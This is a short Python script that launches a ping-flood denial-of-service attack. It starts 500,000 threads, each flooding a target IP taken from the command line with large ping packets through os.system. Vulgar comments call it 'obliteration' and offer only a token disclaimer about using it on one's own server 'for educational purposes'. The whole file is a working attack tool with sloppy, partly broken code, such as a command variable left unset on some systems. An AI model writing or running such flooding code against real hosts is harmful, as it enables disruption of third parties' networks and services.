import os
import sys
import platform
from threading import Thread
from multiprocessing import Process

F_MY_SYSTEM = True

def run(ip):
    if platform.system().lower() == "windows":
        # soy boy windows ping 
        cmd = f"ping {ip} -t > NUL"
        
    elif platform.system().lower() == "linux":
        # GIGA CHAD ping
        # definition of obliteration right here
        # if you want your system to get a$$ f$#k, use this
        # this will send flood ping with an interval of 0.1 seconds
        # with packet size reaching the MTU limit of 1.5 KB
        cmd = f"ping {ip} -f -s 1440 -i 0.2 -W 0.01"
        
    os.system(cmd)


if __name__ == "__main__":
    # please only use ip to a server that you own and it won't mind to get a$$fu$$ked, hard
    # i don't hold accountable for any repercussions when done
    # to a public server
    # as this made solely for educational purposes only
    ip = "127.0.0.1"
    
    if len(sys.argv) > 1:
        ip = sys.argv[1]
    
    
    # use appropriate value
    # too big, it will probably lead to some "unexpected" results
    # do at your own risk
    n_process = 1000 * 500
    
    threads = [Thread(target=run, args=(ip, ), daemon=True) for _ in range(n_process)]
    
    for t in threads:
        t.start()
        
    
    try:
        while True:
            continue
    except KeyboardInterrupt:
        pass
    finally:
        for t in threads:
            # t.terminate()
            t.join(timeout=1)
        sys.exit(0)
            
